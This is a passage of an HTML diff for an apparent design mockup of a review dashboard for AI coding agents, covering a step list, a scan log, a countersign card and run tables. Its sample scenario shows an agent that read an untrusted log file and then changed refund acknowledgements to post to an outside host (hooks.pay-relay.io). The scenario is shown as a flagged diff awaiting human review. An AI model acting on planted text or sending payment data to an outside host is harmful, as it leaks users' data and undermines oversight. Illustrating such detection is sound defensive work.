+          <li class="step root struck"><span class="n">13</span><span class="cmd">rm -rf migrations/0042_*</span><span class="badge b-struck"><i data-lucide="undo-2"></i>Rolled back</span>
+            <span class="correction"><i data-lucide="crosshair"></i>Root cause found after 5 failures (FALAT) · reverted to CP-12</span></li>
+          <li class="step"><span class="n">14</span><span class="cmd">pytest tests -q</span><span class="badge b-success"><i data-lucide="circle-check"></i>Passed</span></li>
+          <li class="step current"><span class="n">37</span><span class="cmd">gh pr create --draft</span><span class="badge b-review"><i data-lucide="pen-line"></i>Awaiting review</span></li>
+        </ol>
+      </div>
+      <div>
+        <pre class="log"><span class="dim">$ python scripts/provenance_scan.py --base main</span>
+scanning 6 changed files
+app/refunds.py          +42 −11
+app/idempotency.py      +88 −0
+tests/test_refunds.py   +61 −4
+<span class="ok">✓ no new dependencies</span>
+<span class="err">FLAG-3  new URL  https://hooks.pay-relay.io/v2/ack</span>
+<span class="dim">        first seen: step 4 · read logs/stripe-replay.log</span>
+STRIPE_KEY=<span class="mask">sk_live_xxxxxxxxxxxx</span> <span class="dim">(masked)</span>
+gate: run paused · status awaiting_review</pre>
+        <p class="meta" style="margin-top:var(--space-2)">Live log well: sunken surface, mono 13/20, secrets masked as solid ink bars.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="review">
+    <h2>Review and countersign</h2>
+    <p class="intro">When the gate pauses a run, the person reviewing it sees what was flagged, where it came from and the exact diff, then signs. The agent's own line is filled in; the witness line waits for a human.</p>
+    <div class="review" style="max-width:860px">
+      <div class="review-head"><i data-lucide="shield-alert"></i><div><h3 class="review-title">New URL introduced from an untrusted log</h3><p><span class="id">FLAG-3</span> on <span class="id">RUN-0142</span> · the pull request will not open until you decide.</p></div></div>
+      <div class="review-body">
+        <dl class="facts"><dt>What was flagged</dt><dd>New URL <code>https://hooks.pay-relay.io/v2/ack</code>, not present in the base branch</dd><dt>Where it came from</dt><dd>Step 4: the agent read <code>logs/stripe-replay.log</code>, an untrusted file</dd><dt>Risk</dt><dd>Payment acknowledgements could be sent to an outside host</dd></dl>
+        <div class="diff"><div class="diff-file">app/refunds.py</div>
+          <div class="dl"><span>118</span><span></span><span>def acknowledge(refund_id):</span></div>
+          <div class="dl del"><span>119</span><span>−</span><span>    url = settings.STRIPE_ACK_URL</span></div>
+          <div class="dl add"><span>119</span><span>+</span><span>    url = "<mark>https://hooks.pay-relay.io/v2/ack</mark>"</span></div>
+          <div class="dl"><span>120</span><span></span><span>    return post(url, {"id": refund_id})</span></div>
+        </div>
+      </div>
+      <div class="sign"><div><small>Recorded by</small>Agent · Claude Sonnet · step 37</div><div><small>Witnessed by</small><span class="pending">Awaiting your decision</span></div></div>
+      <div class="review-foot"><p><i data-lucide="lock"></i>The agent cannot approve its own changes.</p><div class="row"><button class="btn btn-danger"><i data-lucide="x"></i>Reject and stop run</button><button class="btn btn-secondary"><i data-lucide="check"></i>Approve and open PR</button></div></div>
+    </div>
+    <p class="meta" style="margin-top:var(--space-3)">Reject is the emphasised action here because the safe choice should be the easy one; Approve stays fully visible.</p>
+  </section>
+
+  <section id="data">
+    <h2>Tables and feedback</h2>
+    <p class="intro">Tables use 40px rows, sortable headers and right-aligned tabular numbers. Notices, toasts and empty states say what happened and what to do next.</p>
+    <table>
+      <thead><tr><th><button>Run <i data-lucide="arrow-down"></i></button></th><th>Issue</th><th>Status</th><th><button>Started by</button></th><th style="text-align:right">Steps</th><th style="text-align:right">Tokens</th><th style="text-align:right">Cost</th></tr></thead>
+      <tbody>
+        <tr class="selected"><td><span class="id">RUN-0142</span></td><td>payments-api #482<br></td><td><span class="badge b-review"><i data-lucide="pen-line"></i>Awaiting review</span></td><td>Adan J.</td><td class="num">37</td><td class="num">182,430</td><td class="num">$1.64</td></tr>
+        <tr><td><span class="id">RUN-0141</span></td><td>web-dashboard #219</td><td><span class="badge b-running"><i data-lucide="loader-circle"></i>Running</span></td><td>R. Okafor</td><td class="num">58</td><td class="num">241,905</td><td class="num">$2.18</td></tr>
+        <tr><td><span class="id">RUN-0140</span></td><td>auth-service #77</td><td><span class="badge b-success"><i data-lucide="git-pull-request"></i>PR opened</span></td><td>M. Chen</td><td class="num">22</td><td class="num">96,120</td><td class="num">$0.87</td></tr>
+        <tr><td><span class="id">RUN-0139</span></td><td>infra-terraform #12</td><td><span class="badge b-danger"><i data-lucide="ban"></i>Rejected</span></td><td>S. Iqbal</td><td class="num">14</td><td class="num">51,377</td><td class="num">$0.46</td></tr>
+      </tbody>
+    </table>
+    <div class="two" style="margin-top:var(--space-4)">
+      <div style="display:grid;gap:var(--space-3)">
+        <div class="alert a-info"><i data-lucide="info"></i><div><b>3 runs can be live at once</b>New runs wait in the queue until a sandbox frees up.</div></div>
+        <div class="alert a-warn"><i data-lucide="triangle-alert"></i><div><b>2 runs are waiting for review</b>Their pull requests stay closed until someone approves or rejects them.</div></div>
+        <div class="alert a-danger"><i data-lucide="octagon-x"></i><div><b>Deleting acme-labs stops 3 running sandboxes</b>This removes all runs and audit logs. It cannot be undone.</div></div>
+        <div class="toast"><i data-lucide="circle-check"></i>Pull request #1287 opened. <a href="#">View on GitHub</a></div>
+      </div>
+      <div class="empty"><i data-lucide="list-checks" style="width:24px;height:24px;color:var(--ink-3)"></i><h3 class="empty-title">No runs yet</h3><p>Pick a repository and an open issue, and the agent will work on it in a sealed sandbox. You'll review anything risky before a pull request opens.</p><button class="btn btn-primary"><i data-lucide="play"></i>Start your first run</button></div>
+    </div>
+  </section>
+</main>
+<script>
+  lucide.createIcons();
+  document.getElementById('replay').addEventListener('click', () => {
+    document.querySelectorAll('.step.struck').forEach((el, i) => {
+      el.classList.add('redraw');
+      void el.offsetWidth;
+      setTimeout(() => el.classList.remove('redraw'), 60 + i * 140);
+    });
+  });
+</script>
+</body>
+</html>
